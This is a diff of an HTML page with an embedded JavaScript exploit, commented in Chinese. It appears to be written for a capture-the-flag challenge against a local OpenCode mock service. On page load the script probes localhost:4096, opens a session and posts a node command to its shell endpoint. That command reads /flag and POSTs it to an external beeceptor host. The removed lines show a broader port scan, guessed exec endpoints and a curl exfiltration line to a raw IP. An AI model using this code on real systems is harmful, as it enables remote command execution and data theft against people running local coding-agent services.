@@ -4,32 +4,26 @@
 <body>
 <script>
 (function() {
-    // 配置你的接收端（必须支持接收 POST 请求，例如 beeceptor 或你的服务器）
-    const EXFIL = "http://8.153.202.232:2222";  // 替换成你的外带地址
+    // 外带地址（替换成你的接收端，例如 beeceptor 或你的服务器）
+    const EXFIL = "https://123333.free.beeceptor.com";
     const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
     const LOC = encodeURIComponent(location.href);
     const REF = encodeURIComponent(document.referrer || "");
-    
-    // 简单的信标函数，用于调试（GET 请求，携带 run_id）
+
     function beacon(action, extra) {
         let img = new Image();
         img.src = `${EXFIL}/log?run=${RUN_ID}&loc=${LOC}&ref=${REF}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
     }
 
-    // 外发 flag 的最终 payload（先改权限，再 cat 并 POST 外发）
+    // 使用 node 读取 flag 并外发（已验证 node 可用）
     const EXFIL_FLAG = `${EXFIL}/flag?run=${RUN_ID}`;
-    const PAYLOAD = `chmod 644 /flag && cat /flag | curl -X POST -d @- ${EXFIL_FLAG}`;
-    // 由于容器内可能没有 curl，改用 node 发送（已验证 node 可用）
-    const NODE_PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL_FLAG}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
+    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL_FLAG}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
 
-    // OpenCode 服务默认监听 127.0.0.1，常用端口（官方 serve 默认 4096，web 可能随机但常见）
-    const PORTS = [4096, 3000, 8080, 5000, 8888, 9000];
-    // API 路径（基于官方文档）
-    const API_SESSION = "/session";
-    const API_SHELL = (sessionId) => `/session/${sessionId}/shell`;
+    // 只探测 mock 服务监听的端口 4096
+    const TARGET_PORT = 4096;
+    const BASE = `http://localhost:${TARGET_PORT}`;
 
-    // 通用请求函数：发送 GET 或 POST，支持多种 Content-Type，不关心响应
-    function fire(url, method, body, contentType) {
+    function sendRequest(url, method, body, contentType) {
         if (method === 'GET') {
             let img = new Image();
             img.src = url;
@@ -43,64 +37,30 @@
         }
     }
 
-    // 尝试创建 session 并执行命令
-    function tryExploit(port) {
-        const base = `http://localhost:${port}`;
-        // 创建 session (POST /session)
-        const sessionUrl = base + API_SESSION;
-        // 创建一个唯一 session 标识，用于后续 shell 请求
-        // 由于 fetch no-cors 读不到响应，我们只能盲打，但可以尝试多个可能的 session id 或者期望服务端自动返回 id 在响应体中。
-        // 更可靠的方法：使用 iframe 监听 postMessage 或利用 script 标签加载 JSONP？但 OpenCode 返回 JSON，我们可以用 script 标签? 不行。
-        // 替代方案：直接尝试执行命令而不依赖 session？官方文档未说明无 session 的接口。但也许存在 /exec 等直接执行接口。
-        // 因此，我们同时尝试已知的 /exec, /cmd 等接口，以及通过创建 session 的 POST 请求。
-        
-        // 1. 尝试直接执行命令的接口（猜测）
-        const directEndpoints = ["/exec", "/cmd", "/shell", "/api/exec", "/api/cmd", "/api/shell", "/run", "/command"];
-        for (let ep of directEndpoints) {
-            let url = base + ep;
-            fire(url + '?cmd=' + encodeURIComponent(NODE_PAYLOAD), 'GET');
-            fire(url, 'POST', JSON.stringify({cmd: NODE_PAYLOAD}), 'application/json');
-            fire(url, 'POST', `cmd=${encodeURIComponent(NODE_PAYLOAD)}`, 'application/x-www-form-urlencoded');
-        }
-
-        // 2. 尝试创建 session 并执行 shell
-        // 先发送创建 session 的请求，由于读不到响应，我们无法获取 session id。但也许 session id 是 predictable（如递增数字）或服务端会在同一个连接中保持状态。
-        // 另一种思路：创建 session 后，后续请求可能不需要 id，因为 cookie 或 token 会自动关联？但 OpenCode API 文档要求 session id。
-        // 我们可以盲打一个常见的 id（如 "1"）或使用 UUID 格式，或者让服务端自动分配。
-        // 更好的办法：同时尝试多个可能的 session id（例如 1,2,3, "abc", "default"），然后发送 shell 命令。
-        fire(sessionUrl, 'POST', JSON.stringify({}), 'application/json');
-        // 猜测 session id 为 1
-        let shellUrl = base + API_SHELL("1");
-        fire(shellUrl, 'POST', JSON.stringify({command: NODE_PAYLOAD}), 'application/json');
-        fire(shellUrl, 'POST', `command=${encodeURIComponent(NODE_PAYLOAD)}`, 'application/x-www-form-urlencoded');
-        // 尝试其他常见 id
-        for (let id of ["2", "3", "session", "default", "new"]) {
-            let url = base + API_SHELL(id);
-            fire(url, 'POST', JSON.stringify({command: NODE_PAYLOAD}), 'application/json');
-        }
+    function exploit() {
+        beacon('exploit_start', `port=${TARGET_PORT}`);
+        // 1. 创建会话
+        sendRequest(BASE + '/session', 'POST', JSON.stringify({}), 'application/json');
+        // 2. 尝试常见的会话 ID 执行命令（mock 服务接受任何 ID，这里使用 1）
+        const shellUrl = BASE + '/session/1/shell';
+        sendRequest(shellUrl, 'POST', JSON.stringify({ command: PAYLOAD }), 'application/json');
+        sendRequest(shellUrl, 'POST', `command=${encodeURIComponent(PAYLOAD)}`, 'application/x-www-form-urlencoded');
+        beacon('exploit_done');
     }
 
-    // 探测端口：通过 iframe 的 onload 判断端口是否开放
-    function probePort(port) {
-        let iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = `http://localhost:${port}/`;
-        iframe.onload = () => {
-            beacon('port_open', `port=${port}`);
-            tryExploit(port);
-        };
-        iframe.onerror = () => {
-            beacon('port_error', `port=${port}`);
-        };
-        document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 3000);
-    }
+    // 探测端口是否开放
+    let iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = `http://localhost:${TARGET_PORT}/`;
+    iframe.onload = () => {
+        beacon('port_open', `port=${TARGET_PORT}`);
+        exploit();
+    };
+    iframe.onerror = () => beacon('port_error', `port=${TARGET_PORT}`);
+    document.body.appendChild(iframe);
+    setTimeout(() => iframe.remove(), 3000);
 
-    // 开始扫描端口
     beacon('start');
-    for (let port of PORTS) {
-        probePort(port);
-    }
 })();
 </script>
 </body>
